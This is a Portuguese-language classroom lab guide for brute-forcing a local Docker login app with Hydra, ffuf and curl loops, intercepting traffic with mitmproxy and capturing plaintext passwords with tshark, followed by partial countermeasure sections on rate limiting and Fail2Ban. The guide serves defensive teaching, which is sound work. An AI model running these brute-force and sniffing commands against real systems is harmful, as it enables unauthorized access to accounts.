// 00 · Como funciona

Arquitetura da Atividade

Esta atividade roda 100% via Docker no Windows. Não existe sudo nem apt install aqui — todos os comandos são PowerShell ou docker. Entenda o que roda onde:

🪟 Windows (sua máquina)

  • PowerShell — seu terminal
  • Docker Desktop — motor dos containers
  • Navegador Firefox/Chrome
  • Burp Suite (instalado no Windows)
  • Wireshark (instalado no Windows) — opcional

🐳 Dentro do Docker

  • app-brute — aplicação alvo (Node.js)
  • kali-tools — Hydra, Medusa, ffuf, curl, tshark, fail2ban
  • Ambos na mesma rede interna Docker
  • app-brute exposta em localhost:3000
💡 Por que as ferramentas rodam dentro do Docker?

Hydra, Medusa e ffuf são ferramentas Linux. No Windows, ao invés de instalar WSL2 ou máquina virtual, vamos usar um container Kali Linux que já tem tudo pronto. Você executa os comandos de ataque dentro desse container, direto do PowerShell.

⚠ Aviso ético

Esta atividade é realizada em ambiente isolado (Docker local). É proibido usar estas técnicas em sistemas reais sem autorização. Isso é crime — Lei nº 12.737/2012.

curl
reconhecimento manual

O que é e por que usar primeiro: O curl faz requisições HTTP. Antes de qualquer ataque automatizado, precisamos saber o que a aplicação responde quando a senha está errada. Esse texto — o FAIL_STRING — é exigido por todas as outras ferramentas.

O curl já vem instalado no Windows 10/11. Use direto no PowerShell — sem precisar do container.

  • 1

    Testar com senha errada e anotar a resposta

    🪟 PowerShell
    PowerShell — senha errada
    curl.exe -s -X POST http://localhost:3000/login `
  -d "username=admin&password=senhaerrada" `
  -w "\nStatus HTTP: %{http_code}\n"

    O PowerShell tem um curl que é alias do Invoke-WebRequest — ele não suporta -w, -d e outros parâmetros do curl real. Sempre use curl.exe nesta atividade.

    saída esperada
    {"success":false,"message":"Credenciais inválidas."}
Status HTTP: 401
    📌 Anote agora — você vai usar nas próximas ferramentas!

    O texto Credenciais inválidas. é o seu FAIL_STRING. Toda ferramenta de bruteforce precisa desse texto para saber o que é uma senha errada.

    HTTP 401 = não autorizado = senha errada.

  • 2

    Comparar com a resposta de login correto

    🪟 PowerShell
    PowerShell — senha correta
    curl.exe -s -X POST http://localhost:3000/login `
  -d "username=admin&password=SENHA_CORRETA" `
  -w "\nStatus HTTP: %{http_code}\n"
    saída quando o login funciona
    {"success":true,"message":"Login realizado com sucesso! Bem-vindo, admin."}
Status HTTP: 200
    💡 O que muda entre falha e sucesso?

    Status muda de 401 para 200. O corpo não contém o FAIL_STRING. Essas são as duas formas que as ferramentas usam para detectar sucesso.

Hydra
bruteforce — via container kali

O que é: Ferramenta de bruteforce que testa automaticamente cada senha da wordlist. Roda dentro do container kali-tools via docker exec no PowerShell. A wordlist rockyou.txt já está disponível dentro do container.

  • 1

    Executar o Hydra via docker exec no PowerShell

    O Hydra ataca o endereço app-brute — que é o nome interno do container alvo na rede Docker (os containers se enxergam pelo nome).

    🪟 PowerShell → 🐳 container kali-tools
    PowerShell
    docker exec kali-tools hydra `
  -l admin `
  -P /usr/share/wordlists/rockyou.txt `
  app-brute `
  http-post-form `
  "/login:username=^USER^&password=^PASS^:Credenciais inválidas." `
  -t 4 -V -f
    💡 Por que "app-brute" e não "localhost"?

    Dentro da rede Docker, os containers se comunicam pelo nome do serviço. O container kali-tools enxerga a aplicação como app-brute. Se você usasse localhost, o Hydra estaria apontando para dentro do próprio container kali — o que não funciona.

    Parte do comandoO que faz
    docker exec kali-toolsExecuta o que vem depois dentro do container kali-tools
    hydraA ferramenta de bruteforce (já instalada no Kali)
    -l adminUsuário fixo a testar
    -P rockyou.txtWordlist de senhas dentro do container
    app-bruteNome interno do container alvo na rede Docker
    http-post-formMódulo para formulários HTTP POST
    "/login:...:FAIL"Endpoint, parâmetros e FAIL_STRING separados por :
    ^USER^ / ^PASS^Placeholders substituídos pelo Hydra a cada tentativa
    -t 44 threads paralelas
    -VVerbose — mostra cada tentativa
    -fPara ao encontrar a primeira senha válida

🔍
mitmproxy
intercepção HTTP — via container kali

O que é: O mitmproxy é um proxy de intercepção HTTP/HTTPS em modo terminal — faz o mesmo que o Burp Suite, mas 100% via linha de comando dentro do container. Permite capturar, inspecionar e repetir requisições HTTP sem instalar nada no Windows.

  • 1

    Entender o conceito de proxy de intercepção

    💡 O que é um proxy de intercepção?

    Um proxy fica entre o cliente (seu navegador ou curl) e o servidor. Toda requisição passa por ele antes de chegar ao destino. Isso permite ver, modificar ou repetir qualquer requisição.

    O mitmproxy funciona exatamente assim — mas no terminal, sem interface gráfica.

  • 2

    Iniciar o mitmproxy no container em modo dump (captura passiva)

    O mitmdump é a versão não-interativa — imprime todas as requisições no terminal em tempo real:

    🪟 PowerShell — janela 1 (proxy)
    PowerShell — iniciar proxy na porta 8080
    docker exec -it kali-tools mitmdump `
  --mode regular `
  -p 8080 `
  --flow-detail 2
    saída — proxy aguardando conexões
    Proxy server listening at http://*:8080
  • 3

    Enviar uma requisição de login através do proxy

    Em outra janela do PowerShell, use o curl apontando para o proxy do mitmproxy. O curl envia via proxy, o mitmproxy encaminha para a aplicação e exibe tudo:

    🪟 PowerShell — janela 2
    PowerShell — curl via proxy
    docker exec kali-tools curl -s -X POST http://app-brute:3000/login `
  -d "username=admin&password=teste123" `
  --proxy http://127.0.0.1:8080
    o que aparece na janela 1 (mitmproxy)
    POST http://app-brute:3000/login
  username=admin&password=teste123
  ← 401 Unauthorized 42b
    💡 O que você está vendo

    O mitmproxy está mostrando a requisição completa: método, URL, corpo (com a senha!) e a resposta do servidor. Isso é exatamente o que o Burp Suite Proxy faz.

  • 4

    Repetir a mesma requisição com diferentes senhas (replay manual)

    Agora use o curl em loop para simular o que o Burp Intruder faria — testar várias senhas e observar qual muda a resposta:

    🪟 PowerShell — janela 2
    PowerShell — testar senhas via proxy e observar resposta
    # Testar as primeiras 10 senhas da wordlist via proxy
docker exec kali-tools bash -c "head -10 /usr/share/wordlists/rockyou.txt | while read pass; do
  result=\$(curl -s -X POST http://app-brute:3000/login \
    -d \"username=admin&password=\$pass\" \
    --proxy http://127.0.0.1:8080 \
    -w ' | HTTP:%{http_code}')
  echo \"Senha: \$pass -> \$result\"
done"
    saída — note o HTTP:200 quando a senha está certa
    Senha: 123456    -> {"success":false} | HTTP:401
Senha: password  -> {"success":false} | HTTP:401
Senha: dragon    -> {"success":true}  | HTTP:200  ← encontrada!
Senha: 12345     -> {"success":false} | HTTP:401
    ✓ Mesmo conceito do Burp Intruder

    O Burp Intruder faz exatamente isso de forma visual: testa cada payload da lista e você identifica a resposta diferente pelo tamanho (Length) ou status. Aqui fazemos o mesmo via terminal.

  • 5

    Salvar todas as requisições em arquivo para análise

    🪟 PowerShell — janela 1 (reiniciar mitmproxy com dump em arquivo)
    PowerShell — salvar fluxos em arquivo
    # Parar o mitmproxy anterior com Ctrl+C, depois rodar com -w para salvar
docker exec -it kali-tools mitmdump `
  --mode regular -p 8080 `
  -w /app/logs/captura.mitm

# O arquivo ficará em .\logs\captura.mitm na sua máquina Windows

ffuf

O que é: Ferramenta de fuzzing web ultrarrápida. Objetivo: comparar a velocidade com o Hydra.

  • 1

    Executar o ffuf via docker exec

    🪟 PowerShell → 🐳 container kali-tools
    PowerShell
    docker exec kali-tools ffuf `
  -w /usr/share/wordlists/rockyou.txt:FUZZ `
  -u http://app-brute:3000/login `
  -X POST `
  -d "username=admin&password=FUZZ" `
  -H "Content-Type: application/x-www-form-urlencoded" `

    -X POSTMétodo HTTP
    -d "...FUZZ"Corpo da requisição com o marcador no lugar da senha
    -H "Content-Type"Cabeçalho necessário para formulário web
    -fr "texto"Filtra respostas que contêm esse texto — só mostra o login bem-sucedido

    -mc allMostra todos os status codes

tshark
análise de tráfego — via container kali

O que é: O tshark é o Wireshark em modo linha de comando — captura e analisa pacotes de rede sem precisar de interface gráfica. Roda dentro do container kali-tools, sem instalar nada no Windows.

  • 1

    Listar as interfaces de rede disponíveis no container

    Primeiro precisamos saber o nome da interface que conecta o container kali-tools ao container app-brute:

    🪟 PowerShell → 🐳 container kali-tools
    PowerShell
    docker exec kali-tools tshark -D
    saída esperada — anote o nome da interface eth0
    1. eth0
2. lo (Loopback)
3. any
    💡 Qual interface usar?

    Use eth0 — é a interface de rede interna do container, pela qual o tráfego entre kali-tools e app-brute passa. O número à esquerda (1, 2, 3) também funciona no lugar do nome.

  • 2

    Iniciar a captura de tráfego com tshark

    Execute o tshark em uma janela do PowerShell. Ele ficará capturando até você pressionar Ctrl+C:

    🪟 PowerShell — janela 1 (captura)
    PowerShell — iniciar captura
    docker exec kali-tools tshark `
  -i eth0 `
  -Y "http && tcp.port == 3000" `
  -T fields `
  -e http.request.method `
  -e http.request.uri `
  -e http.file_data `
  -E header=y 2>/dev/null
    💡 O que cada parâmetro faz

    -i eth0 → interface a capturar

    -Y "filtro" → exibe só pacotes HTTP na porta 3000

    -T fields -e campo → exibe campos específicos em vez do pacote inteiro

    http.file_data → o corpo da requisição — onde a senha aparece!

  • 3

    Executar o Hydra em outra janela do PowerShell

    🪟 PowerShell — janela 2 (ataque)
    PowerShell — segundo terminal
    docker exec kali-tools hydra `
  -l admin -P /usr/share/wordlists/rockyou.txt app-brute `
  http-post-form "/login:username=^USER^&password=^PASS^:Credenciais inválidas." `
  -t 4

    Observe a janela 1 — as senhas testadas aparecem em tempo real no tshark.

  • 4

    Salvar a captura em arquivo para análise posterior

    Para capturar e salvar em arquivo .pcap (abrível no Wireshark se instalado):

    🪟 PowerShell
    PowerShell — capturar e salvar
    # Capturar por 30 segundos e salvar no volume compartilhado
docker exec kali-tools tshark `
  -i eth0 `
  -a duration:30 `
  -w /app/logs/captura.pcap 2>/dev/null

# O arquivo ficará em .\logs\captura.pcap na sua máquina Windows
ls .\logs\
  • 5

    Ler as senhas testadas diretamente da captura

    🪟 PowerShell
    PowerShell — extrair senhas do pcap
    docker exec kali-tools tshark `
  -r /app/logs/captura.pcap `
  -Y "http.request.method == POST" `
  -T fields -e http.file_data 2>/dev/null
    saída — senhas testadas visíveis em texto claro
    username=admin&password=123456
username=admin&password=password
username=admin&password=dragon
username=admin&password=12345
    ⚠ Implicação crítica de segurança

    Com HTTP, qualquer pessoa na rede captura e lê as senhas em texto puro — inclusive a senha correta quando o login funciona.

    Com HTTPS, esse campo estaria criptografado e apareceria como bytes ilegíveis no tshark.

Etapa 2 — Contramedida 1: Rate Limiting

O que é: Limita quantas requisições um IP pode fazer por minuto. Acima do limite → erro 429 Too Many Requests.

  • 1

  -d "feature=rateLimit&value=true"

    O rate limiting completamente impediu o ataque? Um atacante com paciência poderia esperar a janela de 1 minuto e continuar?

    O tradeoff do lockout

    ⚠ O lockout pode ser usado como arma de DoS

    Um atacante pode fazer 5 tentativas erradas propositalmente para bloquear a conta de um usuário legítimo.

Etapa 4 — Contramedida 3: Fail2Ban (via container)

O que é: Monitora logs e bane automaticamente IPs suspeitos via iptables. No Windows puro não existe iptables — então vamos rodar o Fail2Ban dentro de um container que monitora o log mapeado via volume.

    Quando aparecer o prompt root@...:#, você está dentro do container. Os comandos a partir daqui são Linux — não PowerShell.

  • 3

    Criar a jail e iniciar o Fail2Ban (dentro do container)

    🐧 Dentro do container (bash)
    bash — dentro do container
    # Criar a jail (o log está mapeado via volume em /app/logs/access.log)
cat > /etc/fail2ban/jail.d/app-brute.conf << 'EOF'
[app-brute]
enabled  = true
filter   = app-brute
logpath  = /app/logs/access.log

bantime  = 600
findtime = 60
EOF
